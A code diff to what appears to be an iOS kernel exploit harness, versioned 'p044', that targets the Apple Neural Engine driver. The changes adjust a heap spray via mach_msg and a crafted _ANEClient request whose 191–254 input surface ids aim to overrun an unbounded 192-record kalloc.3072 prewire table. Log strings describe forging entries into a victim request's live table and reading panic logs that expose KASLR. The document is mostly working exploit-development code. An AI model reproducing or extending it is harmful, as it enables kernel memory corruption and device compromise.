@@ -154,7 +154,7 @@
 #import <math.h>
 #import <objc/message.h>
 
-#define P044_BUILD @"p044-v61-addchain191-B1"
+#define P044_BUILD @"p044-v61b-milphase1"
 
 #define INPUT_COUNT 191
 #define PAYLOAD_SIZE 0xb80
@@ -1684,7 +1684,7 @@ static void *watch_worker(void *arg) {
     [out appendFormat:@"=== p044 session %@ BUILD %@ ===\n",
         LabLocalMilitaryNow(), P044_BUILD];
     [out appendString:@"CoreML staging + mach_msg spray + _ANEClient request fire.\n"];
-    [out appendString:@"Uses .mlmodelc bundle + _ANERequest built from OUR surfaces.\n"];
+    [out appendString:@"Uses bundled model/ MIL dir (addchain-191: on-device ANECCompile in PHASE 3b) or override .mlmodelc + _ANERequest built from OUR surfaces.\n"];
     [out appendFormat:@"v49 desc-tile: same _ANEClient fire; TAIL 8 port-kind victims carry 8 port descs (descs 3..8 sit in the ANE record tile at body+0x1c..0x64); non-tail port-kind = 2-desc v48.1 control. NEON=%u PORT_VICTIM_EVERY=%u HOLE_MODE=%d.\n",
         (unsigned)NEON_WITNESS_COUNT, (unsigned)PORT_VICTIM_EVERY, P044_HOLE_MODE];
     [out appendString:@"v50 consume-forge: B predict launches t-1ms so B's mapRequest object takes the freelist top and A's fire takes the hole BELOW it - A's fill lands INSIDE B's live prewire table (entries 6..68 = our sids). Signals: yBc != yB1 (B read our staged 16KB surfaces), B mid-prewire error, or B wedge. Plus: out_entry scan for A's OUTPUT record (sym 0xfe @body+0x444; the type-2 loop's flags word differs from [1][1], v49's scan was blind to it) and a raw body+0x430 tail dump on every hit.\n"];
@@ -1712,7 +1712,7 @@ static void *watch_worker(void *arg) {
     p044ReqInOverride = 0;
 
     /* v58 REQ_IN sweep loader: p044_req_in.txt with a single "N" line
-       overrides the 254-input default for THIS tap only (deleted on read —
+       overrides the 191-input default for THIS tap only (deleted on read —
        each file write is one deliberate fire; the sweep never persists
        across force-quits). v60 FIX: /var/mobile/Documents is NOT
        app-readable (same sandbox bug class as the v59 sidecar) — the flag
@@ -1776,7 +1776,7 @@ static void *watch_worker(void *arg) {
                searched path so a wrong/stale container UUID can never
                swallow the override again. ASCII only (em-dash mojibakes
                through the log channel). Log-only, no behavior change. */
-            [out appendFormat:@"  [v60] MODEL-FLAG MISS: Documents/p044_model.txt not found - defaulting to addchain. THIS TAP IS A V59-CLASS RUN (addchain): it does NOT test the passthrough hypothesis. To arm the override, write ONE line (e.g. XVRC27_254in_passthrough) into this exact path via SSH/Filza, force-quit, then tap again:\n    %@\n", flagPath];
+            [out appendFormat:@"  [v61b] MODEL-FLAG MISS: Documents/p044_model.txt not found — default = addchain-191 B1 (in-bounds primitive test; no override needed). Override is OPTIONAL: write ONE bundled .mlmodelc NAME (e.g. XVRC27_254in_passthrough) into this exact path via SSH/Filza, force-quit, then tap again:\n    %@\n", flagPath];
         }
     }
 
@@ -1785,9 +1785,24 @@ static void *watch_worker(void *arg) {
     [out appendString:[LabDeviceProfile identBlock]];
     p044_write_log(out);
 
-    // 1. Find model
-    NSURL *modelURL = [self findCoreMLModelURL:out];
-    if (!modelURL) { p044_write_log(out); return out; }
+    // 1. Find model (v61b: addchain-191 B1 = MIL-DIR lane FIRST. The bundle
+    //    ships model/ (model.mil/options.plist/weights1.bin) and NO
+    //    XVRC27_191in_1out_addchain.mlmodelc — v61 ran findCoreMLModelURL
+    //    here and dead-ended ("No .mlmodelc or .mlmodel in bundle") before
+    //    the ANE fire ever armed. Non-addchain (override) keeps the lane.)
+    NSURL *modelURL = nil; /* MLModel A source; nil on the MIL lane */
+    if (p044_model_is_addchain()) {
+        NSURL *milPhase1 = [self findMilModelURL:out];
+        if (!milPhase1) {
+            [out appendString:@"  STOP: addchain-191 B1 needs the bundled model/ MIL dir (no 191in .mlmodelc exists)\n"];
+            p044_write_log(out); return out;
+        }
+        [out appendString:@"  [v61b] MIL-dir lane: model A = on-device ANECCompile (PHASE 3b); "
+                          "CoreML predict lane (coreml-fallback) unavailable this boot — predOK is NOT the oracle, the ANE fire is\n"];
+    } else {
+        modelURL = [self findCoreMLModelURL:out];
+        if (!modelURL) { p044_write_log(out); return out; }
+    }
 
     // 1b. model-name guard (log only, no abort)
     if (p044_model_is_addchain()) {
@@ -1798,9 +1813,12 @@ static void *watch_worker(void *arg) {
     }
     p044_write_log(out);
 
-    // 2. Load model A (the OOB fire)
-    MLModel *model = [self loadCoreMLModel:modelURL out:out];
-    if (!model) { p044_write_log(out); return out; }
+    // 2. Load model A (the OOB fire) — skipped on the MIL lane (model stays nil)
+    MLModel *model = nil;
+    if (modelURL) {
+        model = [self loadCoreMLModel:modelURL out:out];
+        if (!model) { p044_write_log(out); return out; }
+    }
 
     // 2b. Load model B (v47 E1: second live request / consumer)
     MLModel *modelB = [self loadModelB:out];
@@ -1934,11 +1952,18 @@ static void *watch_worker(void *arg) {
     //     sharedConnection (run#1: fresh conn -> sel0 kr=0x5, sel2 0xe00002c2)
     [out appendString:@"\n=== PHASE 3b: _ANEModel/_ANEClient load (sharedConnection) ===\n"];
     NSURL *milURL = [self findMilModelURL:out];
-    p044_ane_load_model(milURL ?: modelURL, modelURL, out);
+    /* v61b: on the MIL lane modelURL is nil — keep the v56 lane-fix alive by
+       falling back to the bundled 254in addchain .mlmodelc as TRANSPORT ONLY
+       (MIL handle==0 retries the mlmodelc URL so the direct lane still arms).
+       It is NOT model A; the request stays p044_req_in() inputs from OUR
+       surfaces. */
+    NSURL *transportFallback = modelURL ?: [[NSBundle mainBundle]
+        URLForResource:@"XVRC27_254in_1out_addchain" withExtension:@"mlmodelc"];
+    p044_ane_load_model(milURL ?: modelURL, transportFallback, out);
     p044_write_log(out);
 
     // 3c. Build _ANERequest — 191 input surfaces = OUR sids, BEFORE the spray
-    [out appendString:@"\n=== PHASE 3c: build _ANERequest (191x0x4000 inputs + 1x0x4000 output, sids -> forge set) ===\n"];
+    [out appendFormat:@"\n=== PHASE 3c: build _ANERequest (%ux0x4000 inputs + 1x0x4000 output, sids -> forge set) ===\n", p044_req_in()];
     g_aneReqOk = p044_ane_build_request(out);
     if (!g_aneReqOk) {
         [out appendString:@"  [!] request not built — fire falls back to CoreML 191 predict (ids[] neutered)\n"];
@@ -2020,10 +2045,11 @@ static void *watch_worker(void *arg) {
     p044_write_log(out);
 
     // 6. FIRE — v48.1 G1/G2: _ANEClient doEvaluateDirectWithModel, ids[] = OUR request surfaces
-    [out appendString:@"\n=== PHASE 5: FIRE — _ANEClient doEvaluateDirectWithModel (191 request surfaces) ===\n"];
-    [out appendString:@">>> ids[] = OUR staged surface sids, indices 0..253 -> overflow records [our sid][0xc0+k][1][1] <<<\n"];
+    [out appendFormat:@"\n=== PHASE 5: FIRE — _ANEClient doEvaluateDirectWithModel (%u request surfaces) ===\n", p044_req_in()];
+    [out appendFormat:@">>> ids[] = OUR staged surface sids, indices 0..%u -> records [our sid][k][1][1]; count=%u = exactly in-bounds vs the 192-record kalloc.3072 table (B1: NO spill expected) <<<\n",
+        p044_req_in() - 1, p044_req_in()];
     [out appendString:@">>> CheckandPrewire: capacity 192, NO bound check, 16B stride INLINE in kalloc.3072 <<<\n"];
-    [out appendString:@">>> PANIC POSSIBLE — ips will have KASLR <<<\n\n"];
+    [out appendString:@">>> B1 in-bounds: panic NOT expected — if it panics anyway, the ips IS evidence (KASLR included) <<<\n\n"];
     p044_write_log(out);
 
     NSString *fireMode = @"not-attempted";
@@ -2045,6 +2071,10 @@ static void *watch_worker(void *arg) {
         fireMode = @"coreml-fallback";
     }
     if ([fireMode isEqual:@"coreml-fallback"]) {
+    if (!model) {
+        [out appendString:@"  model A absent (MIL lane) — CoreML fallback predict skipped; "
+                          "the ANE fire evidence is the oracle this boot\n"];
+    } else {
     NSError *err = nil;
     id<MLFeatureProvider> prediction = [model predictionFromFeatures:provider error:&err];
         predOK = (prediction != nil);
@@ -2060,6 +2090,7 @@ static void *watch_worker(void *arg) {
                     ? @"EXPECTED with addchain"
                     : @"non-addchain: expected when the OUTPUT record steered to the foreign sid (the result went to THEIR memory — oracle is the 6f diff)"];
         }
+    }
     }
     [out appendFormat:@"  fire=%@ rc=%d pred=%s\n", fireMode, fireRc, predOK ? "OK" : "FAILED"];
     p044_write_log(out);
